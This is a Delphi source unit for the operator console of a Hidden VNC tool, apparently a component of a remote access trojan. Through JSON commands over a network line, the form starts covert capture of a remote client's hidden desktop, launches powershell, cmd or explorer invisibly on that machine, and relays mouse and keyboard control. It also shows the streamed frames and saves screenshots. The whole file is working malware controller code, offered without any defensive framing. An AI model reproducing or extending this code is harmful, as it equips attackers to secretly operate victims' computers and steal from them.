unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages,
  System.SysUtils, System.Variants, System.Classes,
  System.JSON, System.SyncObjs,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.Imaging.jpeg,
  ncLines;

type
  TSendJSONProc  = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterProc = procedure(aLine: TncLine) of object;

  TForm10 = class(TForm)
    Panel1    : TPanel;
    StatusBar1: TStatusBar;
    PaintBox1 : TPaintBox;
    Button1   : TButton;   { Start / Stop Capturing }
    Button2   : TButton;   { Run process in hidden desktop }
    Button3   : TButton;   { Screenshot (save current frame) }
    ComboBox1 : TComboBox; { Quality }
    ComboBox2 : TComboBox; { Process to launch }

    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure PaintBox1Paint(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
      X, Y: Integer);
    procedure PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);

  private
    FLine        : TncLine;
    FClientID    : string;
    FSendJSON    : TSendJSONProc;
    FUnregister  : TUnregisterProc;
    FIsCapturing : Boolean;

    { ---- Thread-safe frame buffer ---- }
    FLock        : TCriticalSection;
    FPendingBytes: TBytes;          { raw JPEG bytes written from network thread }
    FHasFrame    : Boolean;         { pending frame not yet decoded }

    { ---- UI-thread bitmap (only ever touched on UI thread) ---- }
    FBitmap      : TBitmap;
    FLastWidth   : Integer;
    FLastHeight  : Integer;

    procedure LogToStatus(const Msg: string);
    procedure SendControlCommand(const Action: string;
      X: Integer = -1; Y: Integer = -1;
      Button: Integer = -1; KeyCode: Integer = -1);
    procedure ApplyPendingFrame;

  public
    constructor Create(AOwner: TComponent); override;
    destructor  Destroy; override;

    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleHVNCJSON(JSONObj: TJSONObject);

    { Called from the network thread - stores bytes, schedules UI decode }
    procedure QueueFrameBytes(const Bytes: TBytes);
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

{ ---------------------------------------------------------------------- }
{  Constructor / Destructor                                                }
{ ---------------------------------------------------------------------- }

constructor TForm10.Create(AOwner: TComponent);
begin
  inherited;
  FLock        := TCriticalSection.Create;
  FBitmap      := TBitmap.Create;
  FIsCapturing := False;
  FLastWidth   := 0;
  FLastHeight  := 0;
  FHasFrame    := False;
  KeyPreview   := True;

  ComboBox1.Items.Clear;
  ComboBox1.Items.Add('10%');
  ComboBox1.Items.Add('20%');
  ComboBox1.Items.Add('30%');
  ComboBox1.Items.Add('40%');
  ComboBox1.Items.Add('50%');
  ComboBox1.Items.Add('60%');
  ComboBox1.Items.Add('70%');
  ComboBox1.Items.Add('80%');
  ComboBox1.Items.Add('90%');
  ComboBox1.Items.Add('100%');
  ComboBox1.ItemIndex := 4; { 50% default }

  ComboBox2.Items.Clear;
  ComboBox2.Items.Add('powershell.exe');
  ComboBox2.Items.Add('cmd.exe');
  ComboBox2.Items.Add('explorer.exe');
  ComboBox2.ItemIndex := 0;
end;

destructor TForm10.Destroy;
begin
  FBitmap.Free;
  FLock.Free;
  inherited;
end;

{ ---------------------------------------------------------------------- }
{  Public Setup                                                            }
{ ---------------------------------------------------------------------- }

procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
begin
  FLine       := aLine;
  FClientID   := ClientID;
  FSendJSON   := ASendJSON;
  FUnregister := AUnregister;
  Caption     := 'Hidden VNC - ' + FClientID;
  LogToStatus('Ready');
end;

procedure TForm10.DetachCallbacks;
begin
  FLine       := nil;
  FSendJSON   := nil;
  FUnregister := nil;
end;

{ ---------------------------------------------------------------------- }
{  Form Events                                                             }
{ ---------------------------------------------------------------------- }

procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if FIsCapturing then
    Button1Click(nil);

  if Assigned(FUnregister) and Assigned(FLine) then
    FUnregister(FLine);

  Action := caFree;
end;

{ ---------------------------------------------------------------------- }
{  Private Helpers                                                         }
{ ---------------------------------------------------------------------- }

procedure TForm10.LogToStatus(const Msg: string);
begin
  StatusBar1.SimpleText := Msg;
end;

{
  ApplyPendingFrame
  -----------------
  Must be called on the UI thread.
  Decodes the pending JPEG bytes into FBitmap and repaints.
}
procedure TForm10.ApplyPendingFrame;
var
  LocalBytes: TBytes;
  MS        : TMemoryStream;
  JPG       : TJPEGImage;
begin
  { Grab bytes under lock, clear pending flag }
  FLock.Enter;
  try
    if not FHasFrame then Exit;
    LocalBytes := FPendingBytes;
    FPendingBytes := nil;
    FHasFrame := False;
  finally
    FLock.Leave;
  end;

  if Length(LocalBytes) = 0 then Exit;

  MS  := TMemoryStream.Create;
  JPG := TJPEGImage.Create;
  try
    MS.WriteBuffer(LocalBytes[0], Length(LocalBytes));
    MS.Position := 0;
    try
      JPG.LoadFromStream(MS);
      { FBitmap lives entirely on the UI thread from here }
      FBitmap.Assign(JPG);
      FLastWidth  := FBitmap.Width;
      FLastHeight := FBitmap.Height;
      PaintBox1.Invalidate;
    except
      { Discard corrupted frame silently }
    end;
  finally
    JPG.Free;
    MS.Free;
  end;
end;

{ ---------------------------------------------------------------------- }
{  QueueFrameBytes  (network thread -> UI thread)                          }
{ ---------------------------------------------------------------------- }

procedure TForm10.QueueFrameBytes(const Bytes: TBytes);
begin
  { Write bytes under lock; only the latest frame is kept (no queue buildup) }
  FLock.Enter;
  try
    FPendingBytes := Copy(Bytes);
    FHasFrame := True;
  finally
    FLock.Leave;
  end;

  { Schedule decode + paint on UI thread }
  TThread.Queue(nil,
    procedure
    begin
      if not (csDestroying in ComponentState) then
        ApplyPendingFrame;
    end);
end;

{ ---------------------------------------------------------------------- }
{  Button Handlers                                                         }
{ ---------------------------------------------------------------------- }

procedure TForm10.Button1Click(Sender: TObject);
var
  JSONObj    : TJSONObject;
  QualityStr : string;
  QualityVal : Integer;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  FIsCapturing := not FIsCapturing;

  JSONObj := TJSONObject.Create;
  try
    if FIsCapturing then
    begin
      QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
      QualityVal := StrToIntDef(QualityStr, 50);
      JSONObj.AddPair('action',  'hvnc_start');
      JSONObj.AddPair('quality', TJSONNumber.Create(QualityVal));
      Button1.Caption := 'Stop Capturing';
      LogToStatus('Starting Hidden VNC...');
    end
    else
    begin
      JSONObj.AddPair('action', 'hvnc_stop');
      Button1.Caption := 'Start Capturing';
      LogToStatus('Stopping Hidden VNC...');
    end;
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_run');
    JSONObj.AddPair('path',   ComboBox2.Text);
    FSendJSON(FLine, JSONObj);
    LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
  finally
    JSONObj.Free;
  end;
end;

{ Button3: Save current frame as a JPEG screenshot }
procedure TForm10.Button3Click(Sender: TObject);
var
  SD  : TSaveDialog;
  JPG : TJPEGImage;
begin
  if FBitmap.Empty then
  begin
    LogToStatus('No frame to save.');
    Exit;
  end;

  SD := TSaveDialog.Create(Self);
  try
    SD.Title      := 'Save Screenshot';
    SD.DefaultExt := 'jpg';
    SD.Filter     := 'JPEG Image (*.jpg)|*.jpg';
    SD.FileName   := 'hvnc_' + FClientID + '_' +
                     FormatDateTime('yyyymmdd_hhnnss', Now) + '.jpg';
    if SD.Execute then
    begin
      JPG := TJPEGImage.Create;
      try
        JPG.Assign(FBitmap);
        JPG.SaveToFile(SD.FileName);
        LogToStatus('Screenshot saved: ' + ExtractFileName(SD.FileName));
      finally
        JPG.Free;
      end;
    end;
  finally
    SD.Free;
  end;
end;

{ ---------------------------------------------------------------------- }
{  ComboBox Quality Change                                                 }
{ ---------------------------------------------------------------------- }

procedure TForm10.ComboBox1Change(Sender: TObject);
var
  JSONObj    : TJSONObject;
  QualityStr : string;
  QualityVal : Integer;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then
    Exit;

  QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
  QualityVal := StrToIntDef(QualityStr, 50);

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action',  'hvnc_quality');
    JSONObj.AddPair('quality', TJSONNumber.Create(QualityVal));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

{ ---------------------------------------------------------------------- }
{  JSON Response Handler                                                   }
{ ---------------------------------------------------------------------- }

procedure TForm10.HandleHVNCJSON(JSONObj: TJSONObject);
var
  Action: string;
begin
  if not Assigned(JSONObj) then Exit;

  if not Assigned(JSONObj.GetValue('action')) then Exit;
  Action := JSONObj.GetValue('action').Value;

  if Action = 'hvnc_status' then
  begin
    if Assigned(JSONObj.Values['message']) then
      LogToStatus(JSONObj.Values['message'].Value);
  end
  else if Action = 'hvnc_error' then
  begin
    if Assigned(JSONObj.Values['message']) then
    begin
      LogToStatus('Error: ' + JSONObj.Values['message'].Value);
      FIsCapturing    := False;
      Button1.Caption := 'Start Capturing';
    end;
  end;
end;

{ ---------------------------------------------------------------------- }
{  PaintBox                                                                }
{ ---------------------------------------------------------------------- }

procedure TForm10.PaintBox1Paint(Sender: TObject);
begin
  { FBitmap is only ever written on the UI thread (inside ApplyPendingFrame),
    so no lock is needed here. }
  if not FBitmap.Empty then
    PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FBitmap);
end;

{ ---------------------------------------------------------------------- }
{  Mouse / Keyboard Control                                                }
{ ---------------------------------------------------------------------- }

procedure TForm10.SendControlCommand(const Action: string;
  X, Y, Button, KeyCode: Integer);
var
  JSONObj  : TJSONObject;
  ScaledX  : Integer;
  ScaledY  : Integer;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then
    Exit;

  { For mouse commands we need a valid remote resolution to scale against }
  if (X <> -1) or (Y <> -1) then
    if (FLastWidth = 0) or (FLastHeight = 0) then
      Exit;

  ScaledX := 0;
  ScaledY := 0;
  if (X <> -1) and (PaintBox1.Width > 0) then
    ScaledX := Round((X / PaintBox1.Width)  * FLastWidth);
  if (Y <> -1) and (PaintBox1.Height > 0) then
    ScaledY := Round((Y / PaintBox1.Height) * FLastHeight);

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', Action);
    if X      <> -1 then JSONObj.AddPair('x',       TJSONNumber.Create(ScaledX));
    if Y      <> -1 then JSONObj.AddPair('y',       TJSONNumber.Create(ScaledY));
    if Button <> -1 then JSONObj.AddPair('button',  TJSONNumber.Create(Button));
    if KeyCode <> -1 then JSONObj.AddPair('keycode', TJSONNumber.Create(KeyCode));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
begin
  BtnIdx := 0;
  if Button = mbRight  then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;
  SendControlCommand('hvnc_mousedown', X, Y, BtnIdx);
end;

procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
  SendControlCommand('hvnc_mousemove', X, Y);
end;

procedure TForm10.PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
begin
  BtnIdx := 0;
  if Button = mbRight  then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;
  SendControlCommand('hvnc_mouseup', X, Y, BtnIdx);
end;

procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  SendControlCommand('hvnc_keydown', -1, -1, -1, Key);
end;

procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  SendControlCommand('hvnc_keyup', -1, -1, -1, Key);
end;

end.
